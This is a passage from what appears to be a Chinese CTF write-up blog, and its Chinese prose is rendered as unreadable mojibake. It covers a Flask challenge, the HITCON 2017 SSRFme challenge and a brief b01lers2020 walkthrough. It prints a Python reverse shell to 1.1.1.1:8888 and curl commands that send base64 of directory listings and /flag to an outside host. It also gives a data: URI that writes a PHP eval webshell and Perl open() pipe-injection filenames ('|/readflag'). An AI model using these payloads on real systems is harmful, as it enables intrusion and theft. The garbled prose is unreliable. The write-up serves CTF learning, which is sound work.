<li>&#x2F;proc&#x2F;pid&#x2F;mem åŒ…å«äº†è¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹</li>
<li>&#x2F;proc&#x2F;pid&#x2F;stat åŒ…å«äº†è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯</li>
<li>&#x2F;proc&#x2F;pid&#x2F;statm åŒ…å«äº†è¿›ç¨‹çš„å†…å­˜ä½¿ç”¨ä¿¡æ¯</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.linuxprobe.com/linux-proc-pid.html">ç®€æLinuxä¸­ &#x2F;proc&#x2F;[pid] ç›®å½•çš„å„æ–‡ä»¶</a><br>&#x2F;proc&#x2F;selfè¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•<br>è¾“å…¥&#x2F;proc&#x2F;self&#x2F;cmdline<br><img src="/images/MKLTD6S4IZ17QPR.png" srcset="/img/loading.gif" lazyload><br>è¯»ä¸€ä¸‹app.py</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs vim">from flask import Flask, Response<br>from flask import render_template<br>from flask import request<br>import os<br>import urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br><span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(SECRET_FILE)<br>SECRET_KEY = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().strip()<br>os.<span class="hljs-built_in">remove</span>(SECRET_FILE)<br><br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def <span class="hljs-built_in">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br>@app.route(<span class="hljs-string">&#x27;/page&#x27;</span>)<br>def page():<br>    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> not url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            <span class="hljs-keyword">res</span> = urllib.urlopen(url)<br>            value = <span class="hljs-keyword">res</span>.<span class="hljs-keyword">read</span>()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    except:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, <span class="hljs-keyword">res</span>=value)<br><br><br>@app.route(<span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span>)<br>def manager():<br>    key = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-keyword">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        <span class="hljs-keyword">shell</span> = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.<span class="hljs-built_in">system</span>(<span class="hljs-keyword">shell</span>)<br>        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure>
<p>è·¯ç”±&#x2F;no_one_know_the_manageré¡µé¢ä¸‹æ¥æ”¶keyå’Œshellå‚æ•°ï¼Œè¦æ±‚key &#x3D;&#x3D; SECRET_KEY<br>os.system(shell)å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</p>
<p>å…ˆçœ‹è¿™ä¸€æ®µä»£ç </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">SECRET_FILE <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br><span class="hljs-attribute">f</span> <span class="hljs-operator">=</span> open(SECRET_FILE)<br>SECRET_KEY <span class="hljs-operator">=</span> f.read().strip()<br>os.remove(SECRET_FILE)<br></code></pre></td></tr></table></figure>
<p>secret.txtè®¿é—®ä¸äº†</p>
<p>f&#x3D;open(SECRET_FILE)è¿™å¥è¯è¯´æ˜è¿™ä¸ªæ–‡ä»¶æ˜¯è¢«openå‡½æ•°æ‰“å¼€çš„ï¼Œæ‰€ä»¥ä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ã€‚ç¨‹åºè¯»å–å®ŒSECRET_KEYä¼šåˆ é™¤&#x2F;tmp&#x2F;secret.txtï¼Œlinuxç³»ç»Ÿæœ‰ä¸ªç‰¹æ€§ï¼Œ<strong>å¦‚æœä¸€ä¸ªç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­</strong>ï¼Œå³ä¾¿ä»å¤–éƒ¨(å¦‚os.remove(SECRET_FILE))åˆ é™¤ä¹‹åï¼Œåœ¨&#x2F;procè¿™ä¸ªè¿›ç¨‹çš„pidç›®å½•ä¸‹çš„fdæ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„fdï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚<br>æ–‡ä»¶æè¿°ç¬¦åœ¨å½¢å¼ä¸Šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ï¼ŒæŒ‡å‘å†…æ ¸ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æ‰€ç»´æŠ¤çš„è¯¥è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„è®°å½•è¡¨ã€‚å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œä¸€äº›æ¶‰åŠåº•å±‚çš„ç¨‹åºç¼–å†™å¾€å¾€ä¼šå›´ç»•ç€æ–‡ä»¶æè¿°ç¬¦å±•å¼€ã€‚</p>
<p>fdæ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢åŒ…å«ç€å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ï¼ˆfile descriptorï¼‰å·®ä¸å¤šå°±æ˜¯è·¯å¾„å•¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·è¿æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•çš„æ–‡ä»¶è·å–è¿›ç¨‹ï¼Œä»è€Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹</p>
<p>æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹æ‰“å¼€çš„æŸä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚åŠ ä¸Šé‚£ä¸ªæ•°å­—å³å¯,ç”¨burpçˆ†ç ´æœ€åçš„æ•°å­—ï¼Œçœ‹å“ªä¸ªæ•°å­—çš„æ–‡ä»¶å¤¹å­˜åœ¨å†…å®¹<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009724931">æ–‡ä»¶æè¿°ç¬¦ï¼ˆFile Descriptorï¼‰ç®€ä»‹</a><br>è¾“å…¥&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3<br><img src="/images/UBDKZ2UZQ98H7WA.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">8</span>YzXsu0k55QR1Oxm/j0xigou1NTWQOx8tQ4mxFhKBKo<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
<p>è¿™å°±æ˜¯å¯†é’¥ï¼Œæœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œurlç¼–ç ä¸€ä¸‹ã€‚<br><img src="/images/FMJMOUPBXARCJ7GB650E.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œå‘ç°shellæ‰§è¡Œçš„å‘½ä»¤å¹¶ä¸ä¼šè¿”å›ç»“æœï¼Œæ‰€ä»¥ä½¿ç”¨åå¼¹shell<br>è¿™é‡Œæˆ‘ç”¨çš„è‡ªå·±çš„aliyunæœåŠ¡å™¨<br>å…ˆåœ¨å®‰å…¨ç»„å¼€æ”¾ä¸€ä¸ªç«¯å£<br><img src="/images/GWSH3K5FDHHWTCTI.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å¼€å¯ç«¯å£<br>firewall-cmd <span class="hljs-attr">--zone</span>=public <span class="hljs-attr">--add-port</span>=<span class="hljs-number">8888</span>/tcp <span class="hljs-attr">--permanent</span><br>é‡å¯é˜²ç«å¢™<br>systemctl restart firewalld<span class="hljs-selector-class">.service</span><br>æŸ¥çœ‹å¼€å¯çš„ç«¯å£<br>firewall-cmd <span class="hljs-attr">--list-ports</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/QG6BVR9XTF81J89D.png" srcset="/img/loading.gif" lazyload><br>è¾“å…¥å‘½ä»¤ nc -lvvp 8888</p>
<p>è¿™é‡Œä½¿ç”¨pythonè„šæœ¬åå¼¹</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;1.1.1.1&quot;</span>,<span class="hljs-number">8888</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure>
<p>åŒæ ·urlåŠ å¯†ä¸‹<br><img src="/images/SX5PKI9KIY.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ–æ˜¯curlåå¼¹shell<br>ncç›‘å¬8888</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash">=curl ip:port/`<span class="hljs-built_in">ls</span> /|<span class="hljs-built_in">base64</span>`</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/A33B3JT3OVMOEL72J.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash">=curl ip:port/`<span class="hljs-built_in">cat</span> /flag|<span class="hljs-built_in">base64</span>`</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/SFP4AJ269VH8D8X5SR.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">?php<br>    <span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$http_x_headers</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[0];<br>    &#125;<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>    @<span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    @<span class="hljs-built_in">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br><br>    <span class="hljs-variable">$data</span> = shell_exec(<span class="hljs-string">&quot;GET &quot;</span> . escapeshellarg(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>    <span class="hljs-variable">$info</span> = pathinfo(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>    <span class="hljs-variable">$dir</span>  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-built_in">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>    @<span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-built_in">chdir</span>(<span class="hljs-variable">$dir</span>);<br>    @file_put_contents(<span class="hljs-built_in">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>    highlight_file(__FILE__);<br></code></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªifæ˜¯è·å–ä½ çš„ipï¼Œè¿™ä¸ªç”¨xffæ”¹ä¸º127.0.0.1ï¼Œä¸æ”¹ä¹Ÿè¡Œ<br>$sandboxæ˜¯æŠŠorangeå’ŒIPè¿æ¥åœ¨ä¸€èµ·MD5åŠ å¯†<br><img src="/images/VJPS3YMLLASUSY6MBO.png" srcset="/img/loading.gif" lazyload><br>mkdir()åˆ›å»ºæ–‡ä»¶<br>chdir()æ”¹å˜å½“å‰ç›®å½•<br>shell_execç±»ä¼¼systemå‘½ä»¤æ‰§è¡Œ<br>pathinfo()å‡½æ•°å°±æ˜¯å°†ä¼ å…¥çš„è·¯å¾„â€å­—å…¸åŒ–â€<br>ä¸¾ä¸ªæ —å­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$info</span>);<br><br>è¾“å‡º-&gt;<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-string">&quot;dirname&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;/sanbox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span> [<span class="hljs-string">&quot;basename&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;666.php&quot;</span> [<span class="hljs-string">&quot;extension&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;php&quot;</span> [<span class="hljs-string">&quot;filename&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;666&quot;</span> &#125;<br></code></pre></td></tr></table></figure>

<p>å†ç†è§£ä¸€ä¸‹shell_execé‡Œçš„GETï¼Œè¿™é‡Œçš„GETä¸æ˜¯æˆ‘ä»¬å¹³å¸¸çš„GETæ–¹å¼ä¼ å‚ï¼Œè¿™é‡Œçš„GETæ˜¯Lib for www in perlä¸­çš„å‘½ä»¤ï¼Œç›®çš„æ˜¯æ¨¡æ‹Ÿhttpçš„GETè¯·æ±‚ï¼ŒGETå‡½æ•°åº•å±‚å°±æ˜¯è°ƒç”¨äº†openå¤„ç†<br>è¿™é‡Œç”¨kaliäº†è§£ä¸€ä¸‹GET<br><img src="/images/69SL0LZ458DOQ0C26.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡ŒGETä¸€ä¸ªæ ¹ç›®å½•ï¼ŒåŠŸèƒ½ç±»ä¼¼äºlsæŠŠå®ƒç»™åˆ—å‡ºæ¥<br>å¯ä»¥è¯»å–æ–‡ä»¶<br><img src="/images/Q2DVTS7ZAI24RBZC.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>openæ¼æ´</strong></p>
<p>åœ¨perlè¯­è¨€ä¸­ï¼Œopenå‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´;å¦‚æœopenæ–‡ä»¶åä¸­å­˜åœ¨ç®¡é“ç¬¦(ä¹Ÿå«æˆ–ç¬¦å·|),å°±ä¼šå°†æ–‡ä»¶åç›´æ¥ä»¥å‘½ä»¤çš„å½¢å¼æ‰§è¡Œï¼Œç„¶åå°†å‘½ä»¤çš„ç»“æœå­˜åˆ°ä¸å‘½ä»¤åŒåçš„æ–‡ä»¶ä¸­ã€‚æœ¬é¢˜ä¸­è°ƒç”¨äº†GETå‡½æ•°ï¼Œè€ŒGETå‡½æ•°åº•å±‚è°ƒç”¨äº†openå‡½æ•°ï¼Œæ•…å­˜åœ¨æ¼æ´ã€‚</p>
<p>ä¸»è¦å‡½æ•°å’Œæ¼æ´äº†è§£å®Œï¼Œå°±å¼€å§‹åšé¢˜äº†<br>å…ˆçœ‹ä¸‹æ ¹ç›®å½•</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=/&amp;filename=<span class="hljs-number">666</span><br><br>ç„¶åè¿›å…¥<span class="hljs-regexp">/sandbox/</span>cfbb870b58817bf7705c0bd826e8dba7/<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/CDFGGR2744GD6QNGH.png" srcset="/img/loading.gif" lazyload><br>æ ¹ç›®å½•ä¸­å­˜åœ¨flagå’Œreadflag<br>è¯»ä¸€ä¸‹</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=/flag&amp;filename=666<br>å•¥ä¹Ÿæ²¡æœ‰<br>?<span class="hljs-attribute">url</span>=/readflag&amp;filename=666<br>ä¸‹è½½äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶<br></code></pre></td></tr></table></figure>
<p>åº”è¯¥æ˜¯éœ€è¦è¿è¡Œreadflagæ¥è¯»flagçš„è„šæœ¬ï¼Œç°åœ¨æƒ³æ–¹æ³•æ‰§è¡Œå®ƒã€‚<br>GETä½¿ç”¨fileåè®®çš„æ—¶å€™ä¼šè°ƒç”¨perlä¸­çš„openå‡½æ•°<br><img src="/images/EHD324EX9XRCHT6YO0.png" srcset="/img/loading.gif" lazyload><br>æ‰€ä»¥æˆ‘ä»¬è¿™é¢˜åˆ©ç”¨fileç»•è¿‡<br>æœ¬é¢˜æœ‰ä¸‰ç§åšæ³•</p>
<h3 id="SSRFé…åˆä¼ªåè®®"><a href="#SSRFé…åˆä¼ªåè®®" class="headerlink" title="SSRFé…åˆä¼ªåè®®"></a>SSRFé…åˆä¼ªåè®®</h3><p>file_put_contentså‡½æ•°ä½¿ç”¨dataä¼ªåè®®æ§åˆ¶å…¶å†…å®¹ï¼Œè¿™é‡Œé€šè¿‡GETååŠ dataä¼ªåè®®å®ç°å†™é©¬<br>å†™å…¥çš„æ–‡ä»¶åç§°åç¼€å¯ä»¥æ˜¯phpï¼Œæ‰€ä»¥ç›´æ¥è®¿é—®sandboxä¸­çš„phpæ–‡ä»¶ï¼Œèšå‰‘è¿æ¥ã€‚è¿è¡Œæ ¹ç›®å½•çš„readflag<br>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?url=data:text/plain,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;&amp;filename=test.php</span><br></code></pre></td></tr></table></figure>
<p>è¿æ¥ä¸­å›½èšå‰‘<br>åœ¨æ ¹ç›®å½•è¿è¡Œreadflag<br><img src="/images/O8ZUNR5R2M2L1I.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="perlè¯­è¨€æ¼æ´"><a href="#perlè¯­è¨€æ¼æ´" class="headerlink" title="perlè¯­è¨€æ¼æ´"></a>perlè¯­è¨€æ¼æ´</h3><p>å› ä¸ºGETå‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº†perlè¯­è¨€ä¸­çš„openå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°å­˜åœ¨rceæ¼æ´ã€‚å½“openå‡½æ•°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­<strong>å­˜åœ¨ç®¡é“ç¬¦</strong>ï¼ˆ<strong>å¹¶ä¸”ç³»ç»Ÿä¸­å­˜åœ¨è¯¥æ–‡ä»¶å</strong>ï¼‰ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œã€‚</p>
<p>æ‰€ä»¥å…ˆåˆ›å»ºå’ŒreadflagåŒåçš„æ–‡ä»¶</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=&amp;filename=|/readflag<br></code></pre></td></tr></table></figure>
<p><img src="/images/JZZERM2J78ERS9QG9Q.png" srcset="/img/loading.gif" lazyload><br>å†æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=file:|/readflag&amp;filename=999<br></code></pre></td></tr></table></figure>
<p><img src="/images/F4N5QCOY6TEBOMH15.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="bash-cæ–¹æ³•"><a href="#bash-cæ–¹æ³•" class="headerlink" title="bash-cæ–¹æ³•"></a>bash-cæ–¹æ³•</h3><p>å’Œä¸Šä¸€ä¸ªç›¸åŒï¼Œbash -cå°±æ˜¯å°†ç›®æ ‡å½“ä½œå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œ</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=&amp;filename=|bash -c /readflag<br></code></pre></td></tr></table></figure>
<p><img src="/images/7536FPF2WU8C.png" srcset="/img/loading.gif" lazyload><br><img src="/images/T6RWWI6JASDNQS7U.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=file:|bash -c /readflag&amp;<span class="hljs-attribute">filename</span>=000<br></code></pre></td></tr></table></figure>
<p><img src="/images/YYR77XDQEDNPSO1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>æ‰“å¼€ç¯å¢ƒï¼Œå‘ç°å›¾ç‰‡ä¼šè‡ªåŠ¨åˆ‡æ¢ä¸ºæ–°çš„é¡µé¢&#x2F;die<br>&#x2F;dieé¡µé¢æ²¡ä»€ä¹ˆä¿¡æ¯<br>çœ‹åŸé¡µé¢æºä»£ç æ‰¾åˆ°jsä»£ç <br><img src="/images/NDWEM1T4FLQ93ZVC.png" srcset="/img/loading.gif" lazyload><br>ç¬¬ä¸€ä¸ªifæ•è·ä½ çš„æŒ‰é”®å€¼ï¼Œ27ä¸ºçš„asciiå¯¹åº”çš„ä¸ºESCï¼Œä¹Ÿå°±æ˜¯æŒ‰ä¸€ä¸‹ESCè¿›å…¥ifè¯­å¥å†…<br>å…¶å®ä¸æŒ‰ESCä¹Ÿè¡Œå®ƒç»™äº†ç›®å½•ï¼Œç›´æ¥è¿›å…¥å³å¯ã€‚ã€‚ã€‚ã€‚<br>è¿›å…¥&#x2F;chase&#x2F;<br><img src="/images/JFY1CFTH10U4RT3G.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥&#x2F;leftt&#x2F;<br><img src="/images/0X73ARJRY0NS01HE.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥&#x2F;shoot&#x2F;<br><img src="/images/0HMJQQZDC5JFYX58.png" srcset="/img/loading.gif" lazyload><br>&#x2F;door&#x2F;<br>è¿™ä¹ˆå¤šé—¨ï¼Œå“ˆäººï¼Œæ‰¾åˆ°jsæ–‡ä»¶<br><img src="/images/9T04EWPWBYBB51NHZQR.png" srcset="/img/loading.gif" lazyload><br>&#x2F;open&#x2F;<br><img src="/images/FUN3KULN2J0LVNGIL.png" srcset="/img/loading.gif" lazyload><br>&#x2F;fight&#x2F;<br><img src="/images/CBULAAH1OEMDT.png" srcset="/img/loading.gif" lazyload><br>å”¯ä¸€æœ‰éš¾ç‚¹çš„åœ°æ–¹ï¼Œæƒ³äº†åŠå¤©keyå€¼èƒ½æ˜¯ä»€ä¹ˆï¼Œç„¶åä¸€çœ‹è¿™ä¹ˆç‚¹è¯éšä¾¿å°±ç»„ä¸ªå¥å­ğŸ¤£<br>hey boys i am backï¼</p>
